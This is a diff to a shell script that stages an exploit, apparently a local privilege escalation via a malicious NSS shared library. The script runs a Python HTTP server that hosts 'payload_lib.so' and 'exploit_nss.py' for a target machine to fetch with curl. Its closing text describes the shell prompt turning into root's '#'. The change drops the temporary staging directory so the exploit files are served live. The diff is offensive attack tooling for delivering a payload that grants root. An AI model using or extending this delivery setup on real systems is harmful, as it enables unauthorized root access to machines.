@@ -27,14 +27,11 @@ if [ ! -f "$LIB_SRC" ] || [ ! -f "$PY_SRC" ]; then
     exit 1
 fi
 
-# Stage files in a clean directory for the HTTP server
-STAGE=$(mktemp -d)
-cp "$LIB_SRC" "$STAGE/payload_lib.so"
-cp "$PY_SRC"  "$STAGE/exploit_nss.py"
-
-# Kill any old instance bound to HTTP_PORT, then serve
+# Kill any old instance bound to HTTP_PORT, then serve live files from the
+# exploit directory so edits to exploit_nss.py take effect on the next curl
+# (no stage directory — it would freeze the served content at server start).
 pkill -f "http.server $HTTP_PORT" 2>/dev/null || true
-(cd "$STAGE" && python3 -m http.server "$HTTP_PORT" >/dev/null 2>&1) &
+(cd "$EXPLOIT_DIR" && python3 -m http.server "$HTTP_PORT" >/dev/null 2>&1) &
 HTTP_PID=$!
 sleep 1
 
@@ -59,5 +56,5 @@ and the prompt becomes '#' (root).
 Press Ctrl+C here to stop the HTTP server when done (PID ${HTTP_PID}).
 EOF
 
-trap "kill $HTTP_PID 2>/dev/null; rm -rf $STAGE; echo '[*] HTTP server stopped'" EXIT
+trap "kill $HTTP_PID 2>/dev/null; echo '[*] HTTP server stopped'" EXIT
 wait
